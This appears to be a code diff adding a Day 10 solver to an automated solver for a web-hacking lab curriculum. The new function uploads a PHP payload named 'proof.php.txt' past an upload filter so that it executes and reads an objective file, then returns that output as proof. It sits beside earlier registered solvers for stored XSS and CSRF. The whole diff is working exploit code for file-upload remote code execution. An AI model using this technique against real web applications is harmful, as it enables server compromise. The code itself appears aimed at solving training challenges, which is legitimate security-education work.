@@ -369,6 +369,42 @@ def solve_csrf(target_url: str) -> str:
 
 
 # ---------------------------------------------------------------------------
+# Curriculum Day 10: File Upload (Bypass upload filter & read proof)
+# ---------------------------------------------------------------------------
+def solve_upload(target_url: str) -> str:
+    """Submit payload past upload filter and extract execution proof."""
+    base = target_url.rstrip("/")
+    status, home, _ = _request(f"{base}/")
+    action_match = re.search(r'action=[\'"](/?[^\'"]+)[\'"]', home)
+    action = action_match.group(1) if action_match else "/upload"
+    if not action.startswith("/"):
+        action = f"/{action}"
+
+    boundary = "----HuntressUploadBoundary2026"
+    body_parts = [
+        f"--{boundary}",
+        'Content-Disposition: form-data; name="file"; filename="proof.php.txt"',
+        "Content-Type: text/plain",
+        "",
+        "<?php echo file_get_contents('/run/huntress/objective.txt'); ?>",
+        f"--{boundary}--",
+        "",
+    ]
+    payload_data = "\r\n".join(body_parts).encode("utf-8")
+    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
+    status, res_body, _ = _request(f"{base}{action}", method="POST", data=payload_data, headers=headers)
+    proof = _extract_proof(res_body)
+    if not proof:
+        loc_match = re.search(r'href=[\'"](/?[^\'"]*proof[^\'"]*)[\'"]', res_body)
+        if loc_match:
+            _, file_body, _ = _request(f"{base}{loc_match.group(1)}")
+            proof = _extract_proof(file_body)
+    if not proof:
+        raise WebHandlerError("Upload did not yield execution proof")
+    return proof
+
+
+# ---------------------------------------------------------------------------
 # Handler Registry & Dynamic Dispatcher
 # ---------------------------------------------------------------------------
 CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
@@ -381,6 +417,7 @@ CURRICULUM_HANDLERS: dict[int, Callable[[str], str]] = {
     7: solve_stored_xss,
     8: solve_session_impression,
     9: solve_csrf,
+    10: solve_upload,
 }
 
 
